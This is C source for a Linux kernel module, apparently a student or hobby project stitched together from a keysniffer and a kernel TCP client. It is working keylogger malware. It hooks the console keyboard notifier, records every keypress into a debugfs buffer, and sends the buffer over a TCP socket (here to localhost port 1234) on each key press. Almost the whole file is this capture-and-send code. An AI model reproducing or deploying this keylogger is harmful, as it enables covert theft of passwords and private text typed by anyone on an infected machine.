// Combination of edited jarun/keysniffer and edited abysamross/simple-linux-kernel-tcp-client-server
// This combination allows to log keys on a computer and send over a network

// cat /sys/kernel/debug/kisni/keys TO SEE KEYS TYPED

#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

// keylogger
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

// network
#include <linux/net.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/in.h>
#include <asm/uaccess.h>
#include <linux/socket.h>
#include <linux/slab.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("willy and sayan");


#define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
#define CHUNK_LEN 12 /* Encoded 'keycode shift' chunk length */
#define US  0 /* Type code for US character log */
#define HEX 1 /* Type code for hexadecimal log */
#define DEC 2 /* Type code for decimal log */

#define KEYSNIFFER_VERSION "1.7"
#define PORT 1234


// keylogger
/* User specified log pattern, used as a module parameter */
static int codes;
/* Register global variable @codes as a module parameter with type and permissions */
module_param(codes, int, 0644);
/* Add module parameter description for @codes */
MODULE_PARM_DESC(codes, "log format (0:US keys (default), 1:hex keycodes, 2:dec keycodes)");

/* Declarations */
static struct dentry *file;
static struct dentry *subdir;
static ssize_t keys_read(struct file *filp, char *buffer, size_t len, loff_t *offset);
static int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_param);


// HERE
int tcp_client_send(struct socket* sock, const char *buf, const size_t length, unsigned long flags);

static const char *us_keymap[][2] = {
    {"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
    {"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
    {"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
    {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
    {"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
    {"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
    {"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
    {"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
    {"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
    {"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
    {"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
    {"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
    {"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
    {".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
    {"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
    {"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
    {"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
    {"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
    {"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
    {"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
    {"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
    {"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
    {"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
    {"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
    {"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
    {"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
    {"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
    {"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
    {"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
    {"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
    {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
    {"_PAUSE_", "_PAUSE_"},                                         // 119
};

static size_t buf_pos;
static char keys_buf[BUF_LEN];

const struct file_operations keys_fops = {
    .owner = THIS_MODULE,
    .read = keys_read,
};

// network
struct socket *conn_socket = NULL;

// DONE DECLARING STUFF //



// keylogger functions

/**
 * keys_read - read function for @file_operations structure
 */
static ssize_t keys_read(struct file *filp,
             char *buffer,
             size_t len,
             loff_t *offset)
{
    return simple_read_from_buffer(buffer, len, offset, keys_buf, buf_pos);
}

static struct notifier_block keysniffer_blk = {
    .notifier_call = keysniffer_cb,
};

/**
 * keycode_to_string - convert keycode to readable string and save in buffer
 *
 * @keycode: keycode generated by the kernel on keypress
 * @shift_mask: Shift key pressed or not
 * @buf: buffer to store readable string
 * @type: log pattern
 */
void keycode_to_string(int keycode, int shift_mask, char *buf, int type)
{
    switch (type) {
    case US:
        if (keycode > KEY_RESERVED && keycode <= KEY_PAUSE) {
            const char *us_key = (shift_mask == 1)
            ? us_keymap[keycode][1]
            : us_keymap[keycode][0];

            snprintf(buf, CHUNK_LEN, "%s", us_key);
        }
        break;
    case HEX:
        if (keycode > KEY_RESERVED && keycode < KEY_MAX)
            snprintf(buf, CHUNK_LEN, "%x %x", keycode, shift_mask);
        break;
    case DEC:
        if (keycode > KEY_RESERVED && keycode < KEY_MAX)
            snprintf(buf, CHUNK_LEN, "%d %d", keycode, shift_mask);
        break;
    }
}

/**
 * keysniffer_cb - keypress callback, called when a keypress
 * event occurs. Ref: @notifier_block structure.
 *
 * Returns NOTIFY_OK
 */
int keysniffer_cb(struct notifier_block *nblock,
          unsigned long code,
          void *_param)
{
    size_t len;
    char keybuf[CHUNK_LEN] = {0};
    struct keyboard_notifier_param *param = _param;

    pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
         code, param->down, param->shift, param->value);

    /* Trace only when a key is pressed down */
    if (!(param->down))
        return NOTIFY_OK;

    /* Convert keycode to readable string in keybuf */
    keycode_to_string(param->value, param->shift, keybuf, codes);
    len = strlen(keybuf);
    if (len < 1) /* Unmapped keycode */
        return NOTIFY_OK;

    /* Reset key string buffer position if exhausted */
    if ((buf_pos + len) >= BUF_LEN)
        buf_pos = 0;

    /* Copy readable key to key string buffer */
    strncpy(keys_buf + buf_pos, keybuf, len);
    buf_pos += len;

    /* Append newline to keys in special cases */
    if (codes)
        keys_buf[buf_pos++] = '\n';
    pr_debug("%s\n", keybuf);


    // HERE
    // does keys_buf end with null byte?
    tcp_client_send(conn_socket, keys_buf, strlen(keys_buf), MSG_DONTWAIT);


    return NOTIFY_OK;
}



// network functions
u32 create_address(u8 *ip)
{
        u32 addr = 0;
        int i;

        for(i=0; i<4; i++)
        {
                addr += ip[i];
                if(i==3)
                        break;
                addr <<= 8;
        }
        printk("addres is: %d\n", (int) addr);
        return addr;
}

int tcp_client_send(struct socket *sock, const char *buf, const size_t length,\
                unsigned long flags)
{
        struct msghdr msg;
        struct kvec vec;
        int len, written = 0, left = length;
        mm_segment_t oldmm;

        msg.msg_name    = 0;
        msg.msg_namelen = 0;
        msg.msg_control = NULL;
        msg.msg_controllen = 0;
        msg.msg_flags   = flags;

        oldmm = get_fs(); set_fs(KERNEL_DS);
repeat_send:
        vec.iov_len = left;
        vec.iov_base = (char *)buf + written;

        len = kernel_sendmsg(sock, &msg, &vec, left, left);
        if((len == -ERESTARTSYS) || (!(flags & MSG_DONTWAIT) &&\
                                (len == -EAGAIN)))
                goto repeat_send;
        if(len > 0) {
                written += len;
                left -= len;
                if(left)
                        goto repeat_send;
        }
        set_fs(oldmm);
        return written ? written:len;
}




int tcp_client_connect(void)
{
        struct sockaddr_in saddr;
        unsigned char destip[5] = {127,0,0,1,'\0'};
        int len = 49;
        char reply[len+1];
        int ret = -1;
        int i=0; // for loop

        ret = sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_socket);
        if(ret < 0)
        {
                pr_info(" *** mtp | Error: %d while creating first socket. | "
                        "setup_connection *** \n", ret);
                goto err;
        }

        memset(&saddr, 0, sizeof(saddr));
        saddr.sin_family = AF_INET;
        saddr.sin_port = htons(PORT);
        saddr.sin_addr.s_addr = htonl(create_address(destip));
        printk("after converting: %d\n", (int) saddr.sin_addr.s_addr);


        ret = conn_socket->ops->connect(conn_socket, (struct sockaddr*)&saddr, sizeof(saddr), O_RDWR);
	if(ret && (ret != -EINPROGRESS)) {
                pr_info(" *** mtp | Error: %d while connecting using conn "
                        "socket. | setup_connection *** \n", ret);
                goto err;
        }


    memset(&reply, 0, len+1);
    strcat(reply, "HOLA\n");

    for (; i<10; i++) {
        tcp_client_send(conn_socket, reply, strlen(reply), MSG_DONTWAIT);
        memset(&reply, 0, len+1);
        strcat(reply, "yay i can keep sending things\n");
    }

    err:
        return -1;
}



static int __init combo_init(void)
{
	// client
	if (codes < 0 || codes > 2)
        return -EINVAL;

    subdir = debugfs_create_dir("kisni", NULL);
    if (IS_ERR(subdir))
        return PTR_ERR(subdir);
    if (!subdir)
        return -ENOENT;

    file = debugfs_create_file("keys", 0400, subdir, NULL, &keys_fops);
    if (!file) {
        debugfs_remove_recursive(subdir);
        return -ENOENT;
    }

    /*
     * Add to the list of console keyboard event
     * notifiers so the callback keysniffer_cb is
     * called when an event occurs.
     */
    register_keyboard_notifier(&keysniffer_blk);



	// network
    pr_info(" *** mtp | network client init | network_client_init *** \n");
    tcp_client_connect();
    return 0;
}

static void __exit combo_exit(void)
{
		// network
        int len = 49;
        char reply[len+1];


		// key logger
		unregister_keyboard_notifier(&keysniffer_blk);
		debugfs_remove_recursive(subdir);


		// network
        memset(&reply, 0, len+1);
        strcat(reply, "ADIOS");
        tcp_client_send(conn_socket, reply, strlen(reply), MSG_DONTWAIT);


        if(conn_socket != NULL) {
        	sock_release(conn_socket);
        }
        pr_info(" *** mtp | network client exiting | network_client_exit *** \n");
}

module_init(combo_init)
module_exit(combo_exit)
